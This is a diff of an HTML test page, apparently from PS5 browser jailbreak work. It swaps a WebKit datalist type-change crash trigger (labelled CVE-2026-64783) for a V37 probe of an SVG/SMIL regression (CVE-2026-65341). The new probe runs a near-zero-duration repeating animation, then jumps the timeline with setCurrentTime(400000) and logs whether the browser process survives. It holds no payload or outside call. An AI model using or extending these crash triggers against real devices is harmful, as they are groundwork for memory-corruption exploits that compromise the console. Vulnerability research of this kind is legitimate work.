@@ -1,6 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PS5 13.60 - V36.1 CVE-2026-64783</title>
+<title>PS5 13.60 - V37 SVG/SMIL regression probe</title>
 
 <style>
 body {
@@ -9,116 +9,138 @@ body {
     font:18px monospace;
     padding:24px;
 }
-input {
-    width:420px;
-    font:24px sans-serif;
-    padding:14px;
+button {
+    font:20px monospace;
+    padding:14px 22px;
+    margin:8px;
 }
 #log {
-    margin-top:25px;
     white-space:pre-wrap;
+    margin-top:20px;
 }
 </style>
 
-<h2>PS5 13.60 — V36.1</h2>
-<p>CVE-2026-64783 / WebKit bug 313521</p>
+<h2>PS5 13.60 — V37</h2>
+<p>CVE-2026-65341 SVG/SMIL regression probe</p>
 
-<p>
-Click the <b>datalist/dropdown indicator</b>
-inside the input below.
-</p>
+<button id="control">CONTROL</button>
+<button id="trigger">TRIGGER ONCE</button>
 
-<input id="target"
-       type="text"
-       list="values"
-       placeholder="CLICK DROPDOWN INDICATOR">
+<svg id="svg"
+     width="200"
+     height="100"
+     xmlns="http://www.w3.org/2000/svg">
 
-<datalist id="values">
-    <option value="TEST-A">
-    <option value="TEST-B">
-</datalist>
+    <rect x="10" y="20"
+          width="40" height="40"
+          fill="white">
+
+        <animate id="anim"
+                 attributeName="x"
+                 from="10"
+                 to="150"
+                 dur="0.0001s"
+                 repeatCount="indefinite"/>
+    </rect>
+</svg>
 
 <pre id="log">STATUS: READY</pre>
 
 <script>
 "use strict";
 
-const input = document.getElementById("target");
-const log = document.getElementById("log");
+const log = document.querySelector("#log");
+const svg = document.querySelector("#svg");
 
-let fired = false;
+let used = false;
 
-function add(s) {
+function checkpoint(s) {
     log.textContent += "\n" + s;
 
     try {
-        localStorage.setItem("V361_LAST", s);
-    } catch(e) {}
+        localStorage.setItem("V37_LAST", s);
+    } catch (_) {}
 }
 
-/*
- * Show the final checkpoint from a previous load.
- * Useful if WebContent dies and the browser reloads.
- */
 try {
-    const previous = localStorage.getItem("V361_LAST");
+    const old = localStorage.getItem("V37_LAST");
+    if (old)
+        checkpoint("PREVIOUS: " + old);
+} catch (_) {}
 
-    if (previous)
-        add("PREVIOUS LAST CHECKPOINT: " + previous);
-} catch(e) {}
+checkpoint("SVGElement = " + typeof SVGElement);
+checkpoint(
+    "setCurrentTime = " +
+    typeof svg.setCurrentTime
+);
 
-add("DATALIST PRESENT");
-add("INPUT TYPE: " + input.type);
-add("WAITING FOR GENUINE DATALIST CLICK");
+document.querySelector("#control").onclick = () => {
 
-input.addEventListener("click", function(event) {
+    checkpoint("CONTROL_ENTER");
 
-    if (fired)
+    try {
+        svg.setCurrentTime(1);
+
+        checkpoint("CONTROL_SETCURRENTTIME_RETURNED");
+
+        requestAnimationFrame(() => {
+            checkpoint("CONTROL_SURVIVED_FRAME");
+        });
+
+    } catch (e) {
+        checkpoint(
+            "CONTROL_EXCEPTION: " +
+            e.name + ": " + e.message
+        );
+    }
+};
+
+document.querySelector("#trigger").onclick = () => {
+
+    if (used) {
+        checkpoint("TRIGGER_BLOCKED_ALREADY_USED");
         return;
-
-    fired = true;
-
-    add("CLICK ENTERED");
-
-    add("TYPE CHANGE START");
-
-    input.type = "button";
-
-    add("TYPE CHANGED: " + input.type);
-
-    /*
-     * The upstream LayoutTest calls gc() here.
-     *
-     * Ordinary webpages don't expose WebKit's
-     * testing-only gc() function, so deliberately
-     * don't fake it.
-     */
-    if (typeof gc === "function") {
-        add("GC AVAILABLE");
-        gc();
-        add("GC RETURNED");
-    } else {
-        add("GC TEST API UNAVAILABLE");
     }
 
-    add("CLICK LISTENER RETURNING");
+    used = true;
 
-}, { once:true });
+    checkpoint("TRIGGER_ENTER");
 
-/*
- * This runs only if execution survives the native
- * event/default-handler processing.
- */
-setInterval(function() {
+    try {
 
-    if (!fired)
-        return;
+        checkpoint("BEFORE_LARGE_TIME_JUMP");
 
-    if (input.type === "button") {
-        add("PAGE SURVIVED NATIVE EVENT HANDLING");
+        /*
+         * Public upstream regression condition:
+         *
+         * extremely short repeating SMIL animation
+         * followed by a very large timeline jump.
+         */
 
-        fired = false;
+        svg.setCurrentTime(400000);
+
+        checkpoint("SETCURRENTTIME_RETURNED");
+
+        queueMicrotask(() => {
+            checkpoint("SURVIVED_MICROTASK");
+        });
+
+        requestAnimationFrame(() => {
+
+            checkpoint("SURVIVED_FRAME");
+
+            setTimeout(() => {
+                checkpoint("V37_COMPLETE");
+            }, 1000);
+
+        });
+
+    } catch (e) {
+
+        checkpoint(
+            "TRIGGER_EXCEPTION: " +
+            e.name + ": " + e.message
+        );
     }
-
-}, 1000);
+};
 </script>
